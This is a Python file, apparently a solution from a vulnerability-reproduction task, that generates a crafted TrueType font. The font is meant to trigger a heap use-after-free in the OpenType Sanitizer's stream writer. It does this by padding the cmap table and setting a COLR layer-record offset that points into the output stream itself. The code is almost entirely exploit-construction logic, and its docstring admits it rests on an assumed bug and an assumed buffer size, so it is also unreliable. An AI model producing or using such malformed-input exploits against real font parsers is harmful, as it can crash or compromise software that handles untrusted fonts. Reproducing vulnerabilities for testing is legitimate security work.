import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a Heap-Use-After-Free
        vulnerability in ots::OTSStream::Write.

        The PoC is a crafted TTF font file. The vulnerability is triggered by
        manipulating the `COLR` table and using a `cmap` table for padding.

        The core idea is to force the `ots::OTSStream::Write` function to be
        called with a source buffer that points into the stream's own memory.
        If this write operation also triggers a reallocation of the stream's
        buffer, the source pointer becomes a dangling pointer, leading to a
        use-after-free during the subsequent memory copy.

        This PoC assumes a specific, plausible bug in the `COLR` table
        serializer and an initial stream buffer capacity of 512 bytes.

        1. A `cmap` table is sized to ~280 bytes to act as padding. When it's
           written to the output stream, the stream becomes mostly full.

        2. A `COLR` table is crafted. Its `offsetLayerRecords` field is set to
           point to where the `BaseGlyphRecord`s have just been written within
           the same table. This tricks a buggy serializer into copying data
           from within the output stream itself.

        3. The number of layer records is chosen such that the total size of
           the write operation exceeds the remaining capacity of the stream,
           forcing a reallocation and triggering the UAF.
        """

        def pack(fmt, *args):
            """Packs data into big-endian byte strings."""
            return struct.pack('>' + fmt, *args)

        def calculate_tt_header_fields(num_tables):
            """Calculates searchRange, entrySelector, and rangeShift for the TTF header."""
            entry_selector = 0
            search_range = 1
            while search_range * 2 <= num_tables:
                search_range *= 2
                entry_selector += 1
            search_range *= 16
            range_shift = num_tables * 16 - search_range
            return search_range, entry_selector, range_shift

        # --- Minimal required font tables ---
        head_data = b"".join([
            pack("I", 0x00010000),  # version
            pack("I", 0x00010000),  # fontRevision
            pack("I", 0x5F0F3CF5),  # checkSumAdjustment (magic number)
            pack("I", 0),          # flags
            pack("H", 1024),       # unitsPerEm
            pack("q", 0),          # created
            pack("q", 0),          # modified
            pack("h", 0), pack("h", 0), pack("h", 1000), pack("h", 1000), # xMin, yMin, xMax, yMax
            pack("H", 0), pack("H", 8), pack("h", 2), pack("h", 0), pack("h", 0) # macStyle, etc.
        ])
        maxp_data = pack("IH", 0x00010000, 2) + b'\x00' * 26
        hhea_data = pack("IhhhhhhhhhhhhH", 0x00010000, 750, -250, 0, 1000, 0, 0, 1000, 1, 0, 0, 0, 0, 0, 0, 1)
        hmtx_data = pack("HH", 512, 0)
        loca_data = pack("HH", 0, 0)
        glyf_data = b""

        # --- Padding and Trigger Tables ---

        # `cmap` table for padding the output stream.
        # Target size is 280 bytes to nearly fill a 512-byte buffer after other
        # tables are processed, setting up the reallocation condition.
        cmap_size = 280
        minimal_cmap = b"".join([
            pack("HH", 0, 1),             # version, numTables
            pack("HHI", 3, 1, 12),        # platformID, encodingID, offset
            pack("HHHHHHH", 4, 16, 0, 2, 2, 0, 0), # Format 4 subtable header
            pack("HHHH", 0xFFFF, 0, 0, 0) # Format 4 subtable data (1 segment)
        ])
        cmap_data = minimal_cmap + b'\x00' * (cmap_size - len(minimal_cmap))

        # Vulnerable `COLR` table.
        num_base_glyph_records = 10  # Results in 60 bytes of base records.
        num_layer_records = 40       # Results in 160 bytes of layer records.
        colr_header_size = 14
        # Both offsets point to the data immediately following the header.
        offset_base_and_layer = colr_header_size

        colr_data_header = pack("HHIHH", 0, num_base_glyph_records, offset_base_and_layer, offset_base_and_layer, num_layer_records)
        base_glyph_records = b"".join([pack("HHH", 0, 0, 0) for _ in range(num_base_glyph_records)])
        layer_records = b"".join([pack("HH", 0, 0) for _ in range(num_layer_records)])
        colr_data = colr_data_header + base_glyph_records + layer_records

        # --- Font Assembly ---
        tables = [
            (b'cmap', cmap_data), (b'COLR', colr_data), (b'glyf', glyf_data),
            (b'head', head_data), (b'hhea', hhea_data), (b'hmtx', hmtx_data),
            (b'loca', loca_data), (b'maxp', maxp_data)
        ]
        # The table directory must be sorted by tag. The sanitizer's processing
        # order might follow this directory order.
        tables.sort(key=lambda x: x[0])
        num_tables = len(tables)

        # TTF file header
        search_range, entry_selector, range_shift = calculate_tt_header_fields(num_tables)
        font_header = pack('IHHHH', 0x00010000, num_tables, search_range, entry_selector, range_shift)

        # Table directory and data blobs
        table_directory = b""
        table_data_blob = b""
        current_offset = 12 + num_tables * 16

        for tag, data in tables:
            # Pad data to 4-byte boundary for checksum calculation and alignment
            padded_data = data + b'\x00' * (-(len(data)) % 4)
            # Checksum is often recalculated by sanitizers, but we provide one.
            checksum = sum(struct.unpack('>' + 'L' * (len(padded_data) // 4), padded_data)) & 0xFFFFFFFF
            
            table_directory += pack('4sIII', tag, checksum, current_offset, len(data))
            
            table_data_blob += padded_data
            current_offset += len(padded_data)

        return font_header + table_directory + table_data_blob